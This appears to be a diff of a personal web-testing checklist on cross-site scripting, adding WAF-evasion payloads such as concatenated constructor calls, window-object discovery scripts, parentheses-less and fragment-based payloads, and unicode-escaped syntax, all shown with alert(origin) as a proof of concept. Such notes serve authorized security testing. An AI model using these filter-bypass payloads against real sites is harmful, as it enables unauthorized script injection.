@@ -15,6 +15,7 @@ Object.keys(window).filter(k => !k.indexOf('on'))
 - in complex targets, try to change the ==final value of the parameter== you can control (after all the sanitization, changes and Rulesets) and confirm there exists XSS then try to bypass the logic.
 - use breakpoint and then ==browse the site== 
 	- (in some cases, breakpoint won't trigger if you reload the same page)
+- in SPAs, there is plenty of ==client-side redirects== => DOM XSS
 # **FUZZ the whitespaces allowed** 
 - [ ] (re read js for hackers)
 - FUZZ for *HTML tags*
@@ -53,21 +54,35 @@ log=[]; let anchor =document.createElement('a'); for(let i=0;i<0x10ffff; i++){ a
 ```
 ### in JS execution
 ##### alert,prompt,etc (WORDS) are filtered ? 
-- [ ] confuse
+- [ ] confuse the waf by String Concatination
+	- [ ] `[]['cons' + 'tructor']['const' + 'ructor']('aler' + 't(origin)')()`
+	- [ ]  `this['aler' + 't']()`
+	- [ ] `a = this; a['a' + 'lert'](origin)`
+> [!note] scripts to find window object and consequently bypassing the waf in new fasion #gold 
 ```js
-- [](`cons`+`tructor`)(`const`+`ructor`)(`aler`+`t(origin)`)()
+for (let x in window)
+    if (window[x] === window)
+        console.log(x);
 ```
+```js
+for (let x in _W)
+    for (let y in _W[x])
+        if (_W[x][y] === window)
+            console.log(x, y);
+```
+- [ ] window.valueOf=alert;window+1 -> **parentheses-less payloads**
 - [ ] payload in fragment part
 ```js
   location=location.hash.split('#')(1) // #javascript:alert(origin)
 ```
 - [ ] unicode encode the js syntax
-	- [ ] \u{0061}
-	- [ ] \u{000000000000000000000061}
+	- [ ] `\u{0061}`
+	- [ ] `\u{000000000000000000000061}`
 ##### paranthesis,brackets,func() etc are filtered?
 - [ ] **alert?.(origin)** -> use `?`
-- [ ] window.valueOf=alert;window+1 -> **parentheses-less payloads**
 
+- [ ] parenthesis, brackets, func(), etc are filtered
+    - [ ] `alert?.(origin)`
 ### PostMessage
 - doesn't generate http req => burp doesn't capture 
 - search for EventListeners 
@@ -481,3 +496,4 @@ Java.perform(function () {
 	    - NO?
 			- [ ] different urls
 			- [ ] try bypasses
+/gitcomm
